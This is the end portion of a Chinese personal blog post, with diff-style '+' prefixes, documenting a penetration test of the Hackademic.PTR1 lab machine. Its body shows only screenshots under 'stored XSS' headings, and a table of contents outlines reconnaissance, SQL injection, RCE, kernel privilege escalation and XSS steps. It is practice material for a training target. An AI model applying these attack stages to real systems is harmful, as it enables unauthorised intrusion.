+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NzMxZDQ1ZDE0M2EyYTM1MDMxNjJkY2FjZWMyYjM0MTRfTlpLMnNQRUJkUURMSHRaY3B0eXY2VFJhM1hUd3FYRnlfVG9rZW46VmJyT2I3d01lb0g0OUN4VjI3aGNZdjVYbnplXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk0Mzg2NGZlMWU0ZDMwMDU5NjgxNTExNjllNTUyNzZfZVBEdVVZTjJOR3N5QVBWV1NtYUh1UVMyMVRqUjR6cGJfVG9rZW46UzZuSGJUMkZ4b2xTMTV4NzZ0d2NWRkJUbktoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h4 id="存储型xss-3"><a href="#存储型xss-3" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjNiYzZhOWU0Y2Y5ZTI4ODM2OTUyNTVjYjY1NjRiZTVfSDc5SGIyZGVnV0lLTHNqMHFqSjEzejRwNUdUMjNxVTRfVG9rZW46VmJFT2JkUTZ5b09CTnB4U0VyMmNXRDEzbmNoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NzBkM2M5N2Q2ZjQ2YTdkYzhkNDMzNTNlMWQzMGE5YjNfUklGVzEwOEpZS2dnNzZ5ZEx5QXI4VHlnNnRVMVRxanpfVG9rZW46Tll3eWI5ZGFzb1lkSU94WG1PdWN1TE1Lbk1nXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h4 id="存储型xss-4"><a href="#存储型xss-4" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NTU1NWVkMDBkODYwMmFiYWFjNjUxNmFhZGMxYjkzYjRfTUY1alUxbmFTNUJXb2ZucDIyRllwMHdlU3lMNGtocHNfVG9rZW46VUluSGJjZHBEb3dUNmx4Wk1CTmNjSVVDbldlXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=N2M2Y2ZjODg2NWIyNTEzYmUzNmFiZmQ2MjUyZjAwZmZfWk9pem1KTTExUFFiT0JBcVpSN1lDc1Q3TmhLeTFQVTJfVG9rZW46WUZGR2JNM1Y0b05pazB4b01zemNmWDFkbjVmXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h4 id="存储型xss-5"><a href="#存储型xss-5" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjk4NDQ0Y2JmNjcxMWMxMjcwNzgwYTY1OGM4Mjk4ZGFfd2dpbWs1ODdzV0ZvV29MNmVOOGJ3NmlmSW0wenBnYk1fVG9rZW46VXNzMGI2TmJRb2RSR3V4WHJ5TmNwT0pGbjFkXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NmU1ZmYyYjkyMTdkNmMwMmM2MmZmYzE2NTUyYzAyZjFfTEJBQ3Vka0x1Sk5PaUdpS21DV0hHTVdrdG13ejVhb3pfVG9rZW46SWJ0NWJpa2tXbzVTdmR4cDFKNWNRSUtObmV1XzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg4ODFmNzlmMjcwODI2YmQ3NzdjZTZkNWRlMDdlM2NfYkZoWmRITXFVQzFzMnlaTzBiQXRnZUZaUTNic1ZwSEhfVG9rZW46WVV6emJHelVKbzlUb1J4TjNDRmNDVVB1bmhkXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://tubby-little-hero.github.io">Tubby Little Hero</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://tubby-little-hero.github.io/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">https://tubby-little-hero.github.io/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://tubby-little-hero.github.io" target="_blank">Tubby Little Hero</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E6%B8%97%E9%80%8F/">web渗透</a><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">实战</a></div><div class="post-share"><div class="social-share" data-image="/img/dao.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透"><img class="cover" src="/img/shuai.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CTF4靶机渗透</div></div><div class="info-2"><div class="info-item-1">靶机渗透</div></div></div></a><a class="pagination-related" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试"><img class="cover" src="/img/weierlite.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CTF5靶机渗透测试</div></div><div class="info-2"><div class="info-item-1">CTF5靶机渗透测试</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞"><img class="cover" src="/img/lingboli.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">xss一些实战漏洞</div></div><div class="info-2"><div class="info-item-1">xss漏洞</div></div></div></a><a class="pagination-related" href="/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/" title="1.22靶场渗透报告"><img class="cover" src="/img/leisai.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">1.22靶场渗透报告</div></div><div class="info-2"><div class="info-item-1">靶场渗透</div></div></div></a><a class="pagination-related" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透"><img class="cover" src="/img/shuai.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">CTF4靶机渗透</div></div><div class="info-2"><div class="info-item-1">靶机渗透</div></div></div></a><a class="pagination-related" href="/2026/01/14/CTF6/" title="CTF6渗透测试"><img class="cover" src="/img/2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">CTF6渗透测试</div></div><div class="info-2"><div class="info-item-1">靶场渗透</div></div></div></a><a class="pagination-related" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试"><img class="cover" src="/img/weierlite.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">CTF5靶机渗透测试</div></div><div class="info-2"><div class="info-item-1">CTF5靶机渗透测试</div></div></div></a><a class="pagination-related" href="/2026/01/11/pWnOS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="pWnOS渗透测试"><img class="cover" src="/img/lingboli.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-11</div><div class="info-item-2">pWnOS渗透测试</div></div><div class="info-2"><div class="info-item-1">靶场渗透</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Tubby Little Hero</div><div class="author-info-description">芜湖</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是我的私人学习笔记（偶尔娱乐）</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E4%B8%80%E4%B8%AA%E6%89%93%E5%8C%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F"><span class="toc-number">1.</span> <span class="toc-text">是一个打包好的镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%94%A8-arp-scan-l-%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5%E5%AD%98%E6%B4%BB%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.1.</span> <span class="toc-text">1.1 用 arp scan -l 扫描网段存活的主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E7%94%A8-nmap-%E6%89%AB%E6%8F%8F%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%92%8C%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">1.2 用 nmap 扫描开放端口的服务和版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-dirb-%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.</span> <span class="toc-text">1.3 dirb 扫描目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-xmlrpc-%E7%9B%AE%E5%BD%95"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 xmlrpc 目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-sql-%E6%B3%A8%E5%85%A5%EF%BC%88get%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 sql 注入（get）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-RCE"><span class="toc-number">3.3.</span> <span class="toc-text">2.3 RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.</span> <span class="toc-text">2.4 内核提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-xss"><span class="toc-number">3.5.</span> <span class="toc-text">2.5 xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">3.5.1.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss-1"><span class="toc-number">3.5.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss-2"><span class="toc-number">3.5.3.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss-3"><span class="toc-number">3.5.4.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss-4"><span class="toc-number">3.5.5.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss-5"><span class="toc-number">3.5.6.</span> <span class="toc-text">存储型xss</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/22/%E2%80%9C%E5%8E%9F%E7%A5%9E%E2%80%9Djs%E9%80%86%E5%90%91/" title="“原神”js逆向"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="“原神”js逆向"/></a><div class="content"><a class="title" href="/2026/02/22/%E2%80%9C%E5%8E%9F%E7%A5%9E%E2%80%9Djs%E9%80%86%E5%90%91/" title="“原神”js逆向">“原神”js逆向</a><time datetime="2026-02-22T08:18:55.000Z" title="发表于 2026-02-22 16:18:55">2026-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞"><img src="/img/lingboli.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xss一些实战漏洞"/></a><div class="content"><a class="title" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞">xss一些实战漏洞</a><time datetime="2026-02-21T08:18:55.000Z" title="发表于 2026-02-21 16:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透"><img src="/img/shuai.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF4靶机渗透"/></a><div class="content"><a class="title" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透">CTF4靶机渗透</a><time datetime="2026-02-21T08:18:55.000Z" title="发表于 2026-02-21 16:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Hackademic.PTR1靶机渗透"><img src="/img/dao.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hackademic.PTR1靶机渗透"/></a><div class="content"><a class="title" href="/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Hackademic.PTR1靶机渗透">Hackademic.PTR1靶机渗透</a><time datetime="2026-02-21T08:18:55.000Z" title="发表于 2026-02-21 16:18:55">2026-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF5靶机渗透测试"/></a><div class="content"><a class="title" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试">CTF5靶机渗透测试</a><time datetime="2026-02-21T08:18:55.000Z" title="发表于 2026-02-21 16:18:55">2026-02-21</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By Tubby Little Hero</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
